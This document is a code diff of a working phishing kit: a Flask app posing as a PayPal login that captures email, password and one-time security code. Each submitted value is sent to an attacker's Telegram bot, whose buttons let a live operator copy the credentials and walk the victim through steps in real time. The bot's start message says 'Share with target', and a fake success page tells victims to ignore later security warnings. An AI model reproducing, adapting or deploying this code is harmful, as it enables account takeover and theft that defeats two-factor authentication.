+                <div class="row justify-content-center">
+                    <div class="col-12 col-sm-10 col-md-8 col-lg-6 col-xl-4">
+                        <!-- Email Step -->
+                        <div id="emailStep" class="animate__animated animate__fadeIn">
+                            <div id="emailError" class="alert alert-danger d-none"></div>
+                            <form id="emailForm" class="mt-4">
+                                <div class="mb-3">
+                                    <label for="email" class="form-label fw-medium">Email or mobile number</label>
+                                    <input type="email" id="email" class="form-control form-control-lg" required>
+                                </div>
+                                <button type="submit" class="btn btn-paypal btn-lg w-100">Next</button>
+                            </form>
+                        </div>
+
+                        <!-- Password Step -->
+                        <div id="passwordStep" class="d-none animate__animated animate__fadeIn">
+                            <div id="passwordError" class="alert alert-danger d-none"></div>
+                            <div class="d-flex align-items-center gap-3 mb-4">
+                                <div class="avatar-circle" id="avatarCircle">U</div>
+                                <div class="user-email text-muted" id="userEmail"></div>
+                            </div>
+                            <form id="passwordForm">
+                                <div class="mb-3">
+                                    <label for="password" class="form-label fw-medium">Password</label>
+                                    <div class="position-relative">
+                                        <input type="password" id="password" class="form-control form-control-lg" required>
+                                        <button type="button" class="btn btn-link password-toggle position-absolute top-50 end-0 translate-middle-y" id="passwordToggle">
+                                            <i class="bi bi-eye"></i>
+                                        </button>
+                                    </div>
+                                    <a href="#" class="text-decoration-none small mt-2 d-inline-block">Forgot password?</a>
+                                </div>
+                                <button type="submit" class="btn btn-paypal btn-lg w-100">Log In</button>
+                            </form>
+                        </div>
+
+                        <!-- OTP Step -->
+                        <div id="otpStep" class="d-none animate__animated animate__fadeIn">
+                            <div id="otpError" class="alert alert-danger d-none"></div>
+                            <div id="otpResend" class="alert alert-success d-none">We sent you a new OTP.</div>
+                            <div class="text-center mb-4">
+                                <h4 class="fw-semibold">Enter security code</h4>
+                                <p class="text-muted">Enter the 6-digit code we sent you</p>
+                            </div>
+                            <form id="otpForm">
+                                <div class="mb-3">
+                                    <input type="text" id="otp" class="form-control otp-input" placeholder="• • • • • •" maxlength="6" required>
+                                    <div class="d-flex justify-content-between align-items-center mt-2">
+                                        <span class="timer-text text-muted small" id="timerText">Code expires in 1:00</span>
+                                        <button type="button" class="btn btn-link btn-sm p-0 text-decoration-none resend-btn" id="resendBtn" disabled>Resend code</button>
+                                    </div>
+                                </div>
+                                <button type="submit" class="btn btn-paypal btn-lg w-100" id="otpSubmitBtn" disabled>Continue</button>
+                            </form>
+                        </div>
+
+                        <!-- Success Step -->
+                        <div id="successStep" class="d-none">
+                            <!-- Verification page loaded here -->
+                        </div>
+                    </div>
                 </div>
-                <form id="passwordForm">
-                    <div class="form-group">
-                        <label for="password">Password</label>
-                        <input type="password" id="password" required>
-                        <a href="#" class="link" style="display: inline-block; margin-top: 0.5rem;">Forgot password?</a>
-                    </div>
-                    <button type="submit" class="btn">Log In</button>
-                </form>
             </div>
-        </div>
-    </main>
+        </main>
 
-    <!-- Footer -->
-    <footer>
-        <div class="footer-container">
-            <div class="footer-links">
-                <a href="#">Contact Us</a>
-                <a href="#">Privacy</a>
-                <a href="#">Legal</a>
-                <a href="#">Worldwide</a>
+        <!-- Footer -->
+        <footer class="border-top py-4 mt-5">
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-auto">
+                        <div class="d-flex flex-wrap gap-3 justify-content-center small">
+                            <a href="#" class="text-muted text-decoration-none">Contact Us</a>
+                            <a href="#" class="text-muted text-decoration-none">Privacy</a>
+                            <a href="#" class="text-muted text-decoration-none">Legal</a>
+                            <a href="#" class="text-muted text-decoration-none">Worldwide</a>
+                        </div>
+                    </div>
+                </div>
             </div>
-        </div>
-    </footer>
+        </footer>
+    </div>
+
+    <!-- Bootstrap Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
+    <!-- Animate.css -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
     <script>
-        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const emailStep = document.getElementById('emailStep');
-        const passwordStep = document.getElementById('passwordStep');
-        const emailForm = document.getElementById('emailForm');
-        const passwordForm = document.getElementById('passwordForm');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const userEmail = document.getElementById('userEmail');
-        const avatarCircle = document.getElementById('avatarCircle');
-        const emailError = document.getElementById('emailError');
-        const passwordError = document.getElementById('passwordError');
+        // Ultra-fast session ID generation
+        let sessionId = 'p_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
+        let currentStep = 'email';
+        let otpTimer = 60;
+        let timerInterval = null;
+        let isWaitingForOperator = false;
 
-        function showLoading(text) {
-            loadingOverlay.querySelector('#loadingText').textContent = text;
-            loadingOverlay.classList.add('active');
-        }
+        // DOM elements
+        const elements = {
+            loading: document.getElementById('loadingOverlay'),
+            loadingText: document.getElementById('loadingText'),
+            emailStep: document.getElementById('emailStep'),
+            passwordStep: document.getElementById('passwordStep'),
+            otpStep: document.getElementById('otpStep'),
+            successStep: document.getElementById('successStep'),
+            emailForm: document.getElementById('emailForm'),
+            passwordForm: document.getElementById('passwordForm'),
+            otpForm: document.getElementById('otpForm'),
+            emailInput: document.getElementById('email'),
+            passwordInput: document.getElementById('password'),
+            otpInput: document.getElementById('otp'),
+            userEmail: document.getElementById('userEmail'),
+            avatarCircle: document.getElementById('avatarCircle'),
+            passwordToggle: document.getElementById('passwordToggle'),
+            timerText: document.getElementById('timerText'),
+            resendBtn: document.getElementById('resendBtn'),
+            otpSubmitBtn: document.getElementById('otpSubmitBtn'),
+            emailError: document.getElementById('emailError'),
+            passwordError: document.getElementById('passwordError'),
+            otpError: document.getElementById('otpError'),
+            otpResend: document.getElementById('otpResend')
+        };
 
-        function hideLoading() {
-            loadingOverlay.classList.remove('active');
-        }
+        // Utility functions
+        const utils = {
+            showLoading(text) {
+                elements.loadingText.textContent = text;
+                elements.loading.classList.remove('d-none');
+                elements.loading.classList.add('d-flex');
+                isWaitingForOperator = true;
+            },
 
-        function showStep(step) {
-            emailStep.classList.add('hidden');
-            passwordStep.classList.add('hidden');
+            hideLoading() {
+                elements.loading.classList.remove('d-flex');
+                elements.loading.classList.add('d-none');
+                isWaitingForOperator = false;
+            },
 
-            emailError.classList.add('hidden');
-            passwordError.classList.add('hidden');
-
-            if (step === 'email') {
-                emailStep.classList.remove('hidden');
-            } else if (step === 'password') {
-                passwordStep.classList.remove('hidden');
-            }
-        }
-
-        async function sendToBackend(field, value) {
-            try {
-                const response = await fetch('/submit', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({session_id: sessionId, field: field, value: value})
+            showStep(step) {
+                // Hide all steps
+                [elements.emailStep, elements.passwordStep, elements.otpStep, elements.successStep].forEach(el => {
+                    el.classList.add('d-none');
                 });
-                return await response.json();
-            } catch (error) {
-                return { success: false };
-            }
-        }
+                [elements.emailError, elements.passwordError, elements.otpError, elements.otpResend].forEach(el => {
+                    el.classList.add('d-none');
+                });
 
-        async function checkOperatorStatus() {
-            const startTime = Date.now();
-            const timeout = 5000;
-            
-            while ((Date.now() - startTime) < timeout) {
-                try {
-                    const response = await fetch('/status?session_id=' + sessionId);
-                    const data = await response.json();
-                    if (data.action) {
-                        handleOperatorAction(data.action);
-                        return;
+                // Show target step
+                elements[step + 'Step']?.classList.remove('d-none');
+                currentStep = step;
+            },
+
+            formatTime(seconds) {
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                return `${mins}:${secs.toString().padStart(2, '0')}`;
+            },
+
+            startOtpTimer() {
+                if (timerInterval) clearInterval(timerInterval);
+
+                otpTimer = 60;
+                elements.resendBtn.disabled = true;
+                elements.timerText.classList.remove('text-danger');
+                elements.otpResend.classList.add('d-none');
+
+                timerInterval = setInterval(() => {
+                    otpTimer--;
+                    elements.timerText.textContent = `Code expires in ${utils.formatTime(otpTimer)}`;
+
+                    if (otpTimer <= 0) {
+                        clearInterval(timerInterval);
+                        elements.timerText.textContent = 'Code expired';
+                        elements.timerText.classList.add('text-danger');
+                        elements.resendBtn.disabled = false;
                     }
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                }, 1000);
+            }
+        };
+
+        // API functions
+        const api = {
+            async sendToBackend(field, value) {
+                try {
+                    const response = await fetch('/submit', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            session_id: sessionId,
+                            field: field,
+                            value: value
+                        })
+                    });
+                    return await response.json();
                 } catch (error) {
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                    return { success: false };
+                }
+            },
+
+            async checkOperatorStatus() {
+                const startTime = Date.now();
+                const timeout = 10000; // 10 second timeout
+
+                while ((Date.now() - startTime) < timeout && isWaitingForOperator) {
+                    try {
+                        const response = await fetch('/status?session_id=' + sessionId + '&t=' + Date.now());
+                        const data = await response.json();
+                        
+                        if (data.action) {
+                            handlers.handleOperatorAction(data.action);
+                            return;
+                        }
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    } catch (error) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
+                }
+                // Fallback: if no response, proceed to next step
+                if (isWaitingForOperator) {
+                    utils.hideLoading();
+                    if (currentStep === 'email') utils.showStep('password');
+                    else if (currentStep === 'password') utils.showStep('otp');
                 }
             }
-            handleOperatorAction('show_password');
-        }
+        };
 
-        function handleOperatorAction(action) {
-            hideLoading();
-            if (action === 'show_password') showStep('password');
-            else if (action === 'show_success') window.location.href = '/verification-success';
-            else if (action === 'show_email_error') {
-                showStep('email');
-                emailError.classList.remove('hidden');
-            }
-            else if (action === 'show_password_error') {
-                showStep('password');
-                passwordError.classList.remove('hidden');
-            }
-        }
+        // Event handlers
+        const handlers = {
+            handleOperatorAction(action) {
+                utils.hideLoading();
+                
+                switch(action) {
+                    case 'show_password':
+                        utils.showStep('password');
+                        break;
+                    case 'show_otp':
+                        utils.showStep('otp');
+                        utils.startOtpTimer();
+                        break;
+                    case 'show_success':
+                        elements.successStep.innerHTML = `''' + VERIFICATION_SUCCESS_TEMPLATE + '''`;
+                        utils.showStep('success');
+                        break;
+                    case 'show_email_error':
+                        utils.showStep('email');
+                        elements.emailError.textContent = 'Incorrect email address. Please try again.';
+                        elements.emailError.classList.remove('d-none');
+                        elements.emailInput.value = '';
+                        elements.emailInput.focus();
+                        break;
+                    case 'show_password_error':
+                        utils.showStep('password');
+                        elements.passwordError.textContent = 'Incorrect password. Please try again.';
+                        elements.passwordError.classList.remove('d-none');
+                        elements.passwordInput.value = '';
+                        elements.passwordInput.focus();
+                        break;
+                    case 'show_otp_error':
+                        utils.showStep('otp');
+                        elements.otpError.textContent = 'Incorrect OTP. Please try again.';
+                        elements.otpError.classList.remove('d-none');
+                        elements.otpInput.value = '';
+                        elements.otpInput.focus();
+                        utils.startOtpTimer();
+                        break;
+                    case 'resend_otp':
+                        utils.showStep('otp');
+                        elements.otpInput.value = '';
+                        elements.otpResend.classList.remove('d-none');
+                        utils.startOtpTimer();
+                        break;
+                }
+            },
 
-        emailForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const emailValue = emailInput.value;
-            if (emailValue) {
-                showLoading('Verifying email address...');
-                await sendToBackend('email', emailValue);
-                userEmail.textContent = emailValue;
-                avatarCircle.textContent = emailValue[0].toUpperCase();
-                await checkOperatorStatus();
-            }
-        });
+            // Form submissions
+            async handleEmailSubmit(e) {
+                e.preventDefault();
+                const emailValue = elements.emailInput.value.trim();
+                
+                if (emailValue) {
+                    utils.showLoading('Verifying email address...');
+                    await fetch('/clear-session?session_id=' + sessionId);
+                    await api.sendToBackend('email', emailValue);
+                    elements.userEmail.textContent = emailValue;
+                    elements.avatarCircle.textContent = emailValue[0].toUpperCase();
+                    await api.checkOperatorStatus();
+                }
+            },
 
-        passwordForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const passwordValue = passwordInput.value;
-            if (passwordValue) {
-                showLoading('Checking password...');
-                await sendToBackend('password', passwordValue);
-                await checkOperatorStatus();
+            async handlePasswordSubmit(e) {
+                e.preventDefault();
+                const passwordValue = elements.passwordInput.value;
+                
+                if (passwordValue) {
+                    utils.showLoading('Checking password...');
+                    await api.sendToBackend('password', passwordValue);
+                    await api.checkOperatorStatus();
+                }
+            },
+
+            async handleOtpSubmit(e) {
+                e.preventDefault();
+                const otpValue = elements.otpInput.value;
+                
+                if (otpValue.length === 6) {
+                    utils.showLoading('Verifying security code...');
+                    await api.sendToBackend('otp', otpValue);
+                    await api.checkOperatorStatus();
+                }
+            },
+
+            handlePasswordToggle() {
+                if (elements.passwordInput.type === 'password') {
+                    elements.passwordInput.type = 'text';
+                    elements.passwordToggle.innerHTML = '<i class="bi bi-eye-slash"></i>';
+                } else {
+                    elements.passwordInput.type = 'password';
+                    elements.passwordToggle.innerHTML = '<i class="bi bi-eye"></i>';
+                }
+            },
+
+            handleOtpInput() {
+                elements.otpInput.value = elements.otpInput.value.replace(/\D/g, '').slice(0, 6);
+                elements.otpSubmitBtn.disabled = elements.otpInput.value.length !== 6;
+            },
+
+            async handleResendOtp() {
+                if (!elements.resendBtn.disabled) {
+                    utils.showLoading('Requesting new code...');
+                    elements.otpInput.value = '';
+                    elements.otpSubmitBtn.disabled = true;
+                    await api.sendToBackend('request_otp', 'new_otp_requested');
+                    utils.showStep('otp');
+                    utils.startOtpTimer();
+                    elements.otpResend.classList.remove('d-none');
+                    utils.hideLoading();
+                }
             }
-        });
+        };
+
+        // Event listeners
+        elements.emailForm.addEventListener('submit', handlers.handleEmailSubmit);
+        elements.passwordForm.addEventListener('submit', handlers.handlePasswordSubmit);
+        elements.otpForm.addEventListener('submit', handlers.handleOtpSubmit);
+        elements.passwordToggle.addEventListener('click', handlers.handlePasswordToggle);
+        elements.otpInput.addEventListener('input', handlers.handleOtpInput);
+        elements.resendBtn.addEventListener('click', handlers.handleResendOtp);
+
+        // Initialize
+        console.log('🚀 PayPal System initialized with session:', sessionId);
     </script>
 </body>
-</html>
-'''
+</html>'''
 
-# Verification Template
-VERIFICATION_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Complete</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+# ========== TELEGRAM FUNCTIONS ==========
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 20px;
-            color: #1a1a1a;
-        }
+def send_telegram_message(text, reply_markup=None):
+    """Ultra-fast Telegram message sending"""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    
+    payload = {
+        'chat_id': CHAT_ID,
+        'text': text,
+        'parse_mode': 'HTML',
+        'disable_notification': True
+    }
+    
+    if reply_markup:
+        payload['reply_markup'] = reply_markup
+    
+    try:
+        # Use thread for non-blocking send
+        threading.Thread(target=lambda: requests.post(url, json=payload, timeout=2)).start()
+        return True
+    except:
+        return False
 
-        .container {
-            width: 100%;
-            max-width: 560px;
-        }
+def create_keyboard(session_id, field, value):
+    """Create Telegram keyboard"""
+    if field == 'email':
+        keyboard = [
+            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
+            [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed_password:{session_id}"}],
+            [{"text": "❌ EMAIL ERROR", "callback_data": f"email_error:{session_id}"}]
+        ]
+    elif field == 'password':
+        keyboard = [
+            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
+            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
+            [{"text": "✅ PROCEED TO OTP", "callback_data": f"proceed_otp:{session_id}"}],
+            [{"text": "❌ PASSWORD ERROR", "callback_data": f"password_error:{session_id}"}]
+        ]
+    elif field == 'otp':
+        keyboard = [
+            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
+            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
+            [{"text": "🔢 COPY OTP", "callback_data": f"copy:{session_id}:otp"}],
+            [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed_success:{session_id}"}],
+            [{"text": "❌ OTP ERROR", "callback_data": f"otp_error:{session_id}"}],
+            [{"text": "🔄 RESEND OTP", "callback_data": f"resend_otp:{session_id}"}]
+        ]
+    else:
+        keyboard = []
+    
+    return {"inline_keyboard": keyboard}
 
-        .card {
-            background: #ffffff;
-            border: 1px solid #e5e7eb;
-            border-radius: 8px;
-            padding: 48px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-        }
+def get_telegram_updates():
+    """Get Telegram updates - optimized for speed"""
+    global last_update_id
+    
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
+        params = {'timeout': 2, 'offset': last_update_id + 1}
+        
+        response = requests.get(url, params=params, timeout=3)
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('ok') and data.get('result'):
+                for update in data['result']:
+                    last_update_id = update['update_id']
+                    
+                    if 'message' in update and 'text' in update['message']:
+                        text = update['message']['text']
+                        if text == '/start':
+                            return f"start_command"
+                    
+                    if 'callback_query' in update:
+                        return update['callback_query']['data']
+        return None
+    except Exception:
+        return None
 
-        .icon-container {
-            width: 64px;
-            height: 64px;
-            margin: 0 auto 24px;
-            background: #10b981;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .checkmark {
-            width: 32px;
-            height: 32px;
-            stroke: #ffffff;
-            stroke-width: 3;
-            fill: none;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            color: #111827;
-            text-align: center;
-            margin-bottom: 16px;
-            letter-spacing: -0.025em;
-        }
-
-        .subtitle {
-            font-size: 15px;
-            color: #6b7280;
-            text-align: center;
-            line-height: 1.6;
-            margin-bottom: 32px;
-        }
-
-        .notice-box {
-            background: #fef3c7;
-            border: 1px solid #fbbf24;
-            border-radius: 6px;
-            padding: 20px;
-            margin-bottom: 24px;
-        }
-
-        .notice-title {
-            font-size: 15px;
-            font-weight: 600;
-            color: #92400e;
-            margin-bottom: 8px;
-        }
-
-        .notice-text {
-            font-size: 14px;
-            color: #78350f;
-            line-height: 1.6;
-        }
-
-        .info-text {
-            font-size: 14px;
-            color: #4b5563;
-            line-height: 1.7;
-            margin-bottom: 24px;
-            text-align: center;
-        }
-
-        .footer {
-            text-align: center;
-            padding-top: 24px;
-            border-top: 1px solid #e5e7eb;
-        }
-
-        .footer-text {
-            font-size: 13px;
-            color: #9ca3af;
-        }
-
-        @media (max-width: 600px) {
-            .card {
-                padding: 32px 24px;
-            }
-
-            h1 {
-                font-size: 22px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="card">
-            <div class="icon-container">
-                <svg class="checkmark" viewBox="0 0 52 52">
-                    <path d="M14 27l7 7 16-16" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-
-            <h1>Verification Successful</h1>
+def process_commands_background():
+    """Background command processor - optimized for Render"""
+    logger.info("🚀 Telegram processor started")
+    
+    while True:
+        try:
+            command = get_telegram_updates()
+            if command:
+                logger.info(f"Processing: {command}")
+                
+                # Start command
+                if command == "start_command":
+                    render_url = os.getenv('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
+                    send_telegram_message(
+                        f"💰 <b>PAYPAL LOGIN SYSTEM ACTIVE</b>\n"
+                        f"🔗 Your Link: {render_url}\n"
+                        f"📱 Share with target\n"
+                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+                    )
+                
+                # Copy commands
+                elif command.startswith('copy:'):
+                    parts = command.split(':')
+                    if len(parts) >= 3:
+                        session_id, field = parts[1], parts[2]
+                        if session_id in sessions:
+                            value = sessions[session_id].get(field, '')
+                            send_telegram_message(
+                                f"📋 <b>COPY {field.upper()}</b>\n<code>{value}</code>\n\n⏰ {datetime.now().strftime('%H:%M:%S')}"
+                            )
+                
+                # Action commands
+                elif ':' in command:
+                    action, session_id = command.split(':', 1)
+                    action_map = {
+                        'proceed_password': 'show_password',
+                        'email_error': 'show_email_error', 
+                        'proceed_otp': 'show_otp',
+                        'proceed_success': 'show_success',
+                        'password_error': 'show_password_error',
+                        'otp_error': 'show_otp_error',
+                        'resend_otp': 'resend_otp'
+                    }
+                    
+                    if action in action_map and session_id in sessions:
+                        sessions[session_id]['action'] = action_map[action]
+                        sessions[session_id]['last_update'] = time.time()
+                        logger.info(f"Set action {action_map[action]} for {session_id}")
             
-            <p class="subtitle">
-                Thank you for verifying your account. We appreciate your cooperation in maintaining account security.
-            </p>
+            time.sleep(0.1)  # Ultra-fast polling
+            
+        except Exception as e:
+            logger.error(f"Command error: {e}")
+            time.sleep(0.2)
 
-            <div class="notice-box">
-                <div class="notice-title">Important Notice</div>
-                <p class="notice-text">
-                    Please disregard any additional verification emails or warnings you may receive within the next 24 hours. Your verification is complete and no further action is required.
-                </p>
-            </div>
-
-            <p class="info-text">
-                If you receive any suspicious emails requesting additional verification, please do not click on any links. Contact us directly through our official channels if you have concerns.
-            </p>
-
-            <div class="footer">
-                <p class="footer-text">Account verification completed successfully</p>
-            </div>
-        </div>
-    </div>
-</body>
-</html>
-'''
+# ========== FLASK ROUTES ==========
 
 @app.route('/')
 def home():
-    """Serve the selected form type"""
-    logger.info(f"Serving form: {current_form_type}")
-    if current_form_type == "amazon":
-        return render_template_string(AMAZON_TEMPLATE)
-    elif current_form_type == "google":
-        return render_template_string(GOOGLE_TEMPLATE)
-    else:  # paypal
-        return render_template_string(PAYPAL_TEMPLATE)
+    """Serve PayPal form"""
+    return render_template_string(PAYPAL_TEMPLATE)
 
 @app.route('/verification-success')
 def verification_success():
     """Verification success page"""
-    return render_template_string(VERIFICATION_TEMPLATE)
+    return render_template_string(VERIFICATION_SUCCESS_TEMPLATE)
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    data = request.json
-    session_id = data.get('session_id')
-    field = data.get('field')
-    value = data.get('value')
-    
-    logger.info(f"Received {field} for session {session_id}")
-    
-    # Initialize session
-    if session_id not in sessions:
-        sessions[session_id] = {}
-    
-    sessions[session_id][field] = value
-    sessions[session_id]['last_update'] = time.time()
-    
-    # CRITICAL: Clear any previous action
-    if 'action' in sessions[session_id]:
-        del sessions[session_id]['action']
-    
-    # Send Telegram notification
-    form_name = "Amazon" if current_form_type == "amazon" else "Google" if current_form_type == "google" else "PayPal"
-    
-    if field == 'email':
-        keyboard = create_keyboard(session_id, 'email', value)
+    """Handle form submissions - ultra-fast"""
+    try:
+        data = request.json
+        session_id = data.get('session_id')
+        field = data.get('field')
+        value = data.get('value')
         
-        send_telegram_message(
-            f"📧 <b>{form_name.upper()} - EMAIL SUBMITTED</b>\n"
-            f"Email: <code>{value}</code>\n"
-            f"Session: {session_id[-12:]}\n"
-            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
-            keyboard
-        )
-    
-    elif field == 'password':
-        keyboard = create_keyboard(session_id, 'password', value)
+        # Initialize session
+        if session_id not in sessions:
+            sessions[session_id] = {}
         
-        send_telegram_message(
-            f"🔑 <b>{form_name.upper()} - PASSWORD SUBMITTED</b>\n"
-            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
-            f"Password: <code>{value}</code>\n"
-            f"Session: {session_id[-12:]}\n"
-            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
-            keyboard
-        )
+        sessions[session_id][field] = value
+        sessions[session_id]['last_update'] = time.time()
+        
+        # Clear previous action
+        if 'action' in sessions[session_id]:
+            del sessions[session_id]['action']
+        
+        # Send Telegram notification
+        keyboard = create_keyboard(session_id, field, value)
+        
+        if field == 'email':
+            send_telegram_message(
+                f"📧 <b>PAYPAL - EMAIL SUBMITTED</b>\n"
+                f"Email: <code>{value}</code>\n"
+                f"Session: {session_id[-12:]}\n"
+                f"⏰ {datetime.now().strftime('%H:%M:%S')}",
+                keyboard
+            )
+        elif field == 'password':
+            send_telegram_message(
+                f"🔑 <b>PAYPAL - PASSWORD SUBMITTED</b>\n"
+                f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
+                f"Password: <code>{value}</code>\n"
+                f"Session: {session_id[-12:]}\n"
+                f"⏰ {datetime.now().strftime('%H:%M:%S')}",
+                keyboard
+            )
+        elif field == 'otp':
+            send_telegram_message(
+                f"🔢 <b>PAYPAL - OTP SUBMITTED</b>\n"
+                f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
+                f"OTP: <code>{value}</code>\n"
+                f"Session: {session_id[-12:]}\n"
+                f"⏰ {datetime.now().strftime('%H:%M:%S')}",
+                keyboard
+            )
+        elif field == 'request_otp':
+            send_telegram_message(
+                f"🔄 <b>PAYPAL - OTP RESEND REQUESTED</b>\n"
+                f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
+                f"Session: {session_id[-12:]}\n"
+                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+            )
+        
+        return jsonify({'success': True})
     
-    return jsonify({'success': True})
+    except Exception as e:
+        logger.error(f"Submit error: {e}")
+        return jsonify({'success': False})
 
 @app.route('/status')
 def status():
+    """Check session status - ultra-fast"""
     session_id = request.args.get('session_id')
-    
-    if session_id in sessions:
-        action = sessions[session_id].get('action')
-        return jsonify({'action': action})
-    
-    return jsonify({'action': None})
+    action = sessions[session_id].get('action') if session_id in sessions else None
+    return jsonify({'action': action})
 
 @app.route('/clear-session')
 def clear_session():
+    """Clear session action"""
     session_id = request.args.get('session_id')
-    if session_id in sessions:
-        if 'action' in sessions[session_id]:
-            del sessions[session_id]['action']
+    if session_id in sessions and 'action' in sessions[session_id]:
+        del sessions[session_id]['action']
     return jsonify({'success': True})
 
-# Start background threads when module loads
+# Start background processor (FIXED for Render - no before_first_request)
 try:
     command_thread = threading.Thread(target=process_commands_background, daemon=True)
     command_thread.start()
-    logger.info("✅ Background Telegram processor started")
+    logger.info("✅ Background processor started")
 except Exception as e:
     logger.error(f"❌ Failed to start background threads: {e}")
 
 if __name__ == "__main__":
-    print("🚀 FIXED LOGIN SYSTEM STARTED")
+    print("🚀 ULTRA-FAST PAYPAL SYSTEM STARTED")
+    print("💰 PayPal: Email → Password → OTP → Success")
     print("📱 Send '/start' to your Telegram bot")
-    print("🌐 Form switching should now work!")
+    print("🌐 Ready for Render deployment")
     
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
